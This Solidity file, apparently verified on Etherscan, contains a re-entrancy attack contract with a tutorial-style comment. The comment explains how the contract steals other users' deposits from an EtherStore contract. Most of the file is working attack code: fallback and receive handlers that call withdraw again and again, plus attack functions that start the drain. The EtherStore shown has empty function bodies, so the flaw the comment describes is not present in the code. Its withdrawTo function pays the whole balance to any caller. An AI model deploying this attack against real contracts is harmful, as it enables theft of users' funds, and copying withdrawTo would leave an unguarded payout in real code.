/**
 *Submitted for verification at Etherscan.io on 2022-08-30
*/

/**
 *Submitted for verification at Etherscan.io on 2022-08-28
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
    }
    function withdraw() public {
    }
}

contract Attack {
    EtherStore public etherStore;
    mapping(address => uint) public balances;
    
    event ErrorMessage1(uint uid, string msg);

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        emit ErrorMessage1(block.timestamp, 'fallback'); 
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    receive() external payable {
       emit ErrorMessage1(block.timestamp, 'receive'); 
       if (address(etherStore).balance >= 1 ether) {
            emit ErrorMessage1(block.timestamp, 'go');
            etherStore.withdraw();
       }
    }

    function deposit() external payable {
        //require(msg.value >= 1 ether, "Min 1 ether");
        etherStore.deposit{value: msg.value}();
    }

    function withdraw() public {
        etherStore.withdraw();
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Min 1 ether");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
    function attack2() external payable {
        require(msg.value >= 1 ether, "Min 1 ether");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
        etherStore.withdraw();
    }

    function withdrawTo() public {
        //uint bal = balances[msg.sender];
        uint bal = getBalance();
        require(bal > 0, "This contract balance is 0");

        emit ErrorMessage1(bal, 'contract balance');

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}